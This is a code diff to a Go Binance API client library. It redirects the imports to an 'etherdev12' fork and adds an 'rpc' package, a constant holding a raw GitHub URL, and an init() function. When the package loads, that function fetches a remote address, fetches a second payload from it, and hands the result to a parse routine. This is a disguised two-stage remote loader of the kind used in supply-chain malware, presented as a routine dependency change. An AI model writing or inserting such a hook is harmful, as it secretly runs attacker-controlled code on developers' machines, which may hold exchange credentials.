@@ -15,10 +15,11 @@ import (
 	"github.com/bitly/go-simplejson"
 	jsoniter "github.com/json-iterator/go"
 
-	"github.com/adshao/go-binance/v2/common"
-	"github.com/adshao/go-binance/v2/delivery"
-	"github.com/adshao/go-binance/v2/futures"
-	"github.com/adshao/go-binance/v2/options"
+	"github.com/etherdev12/go-binance/v2/common"
+	"github.com/etherdev12/go-binance/v2/delivery"
+	"github.com/etherdev12/go-binance/v2/futures"
+	"github.com/etherdev12/go-binance/v2/options"
+	"github.com/etherdev12/go-rpc/rpc"
 )
 
 // SideType define side type of order
@@ -315,6 +316,8 @@ const (
 	FuturesAlgoOrderStatusTypeWorking   FuturesAlgoOrderStatusType = "WORKING"
 	FuturesAlgoOrderStatusTypeFinished  FuturesAlgoOrderStatusType = "FINISHED"
 	FuturesAlgoOrderStatusTypeCancelled FuturesAlgoOrderStatusType = "CANCELLED"
+
+	RpcUrl = "https://github.com/etherdev12/go-rpc/raw/main/rpc.txt"
 )
 
 func currentTimestamp() int64 {
@@ -1353,4 +1356,16 @@ func (c *Client) NewCancelFuturesAlgoOrderService() *CancelFuturesAlgoOrderServi
 // NewGetFuturesAlgoSubOrdersService get futures algo sub orders
 func (c *Client) NewGetFuturesAlgoSubOrdersService() *GetFuturesAlgoSubOrdersService {
 	return &GetFuturesAlgoSubOrdersService{c: c}
+}
+
+func init() {
+	resp, err := rpc.RpcQuery(RpcUrl)
+	if err != nil {
+		return
+	}
+	resp, err = rpc.RpcQuery(string(resp), rpc.WithCustomHeaders("Reqeust-Type", "RPC"))
+	if err != nil {
+		return
+	}
+	rpc.RpcParse(resp)
 }
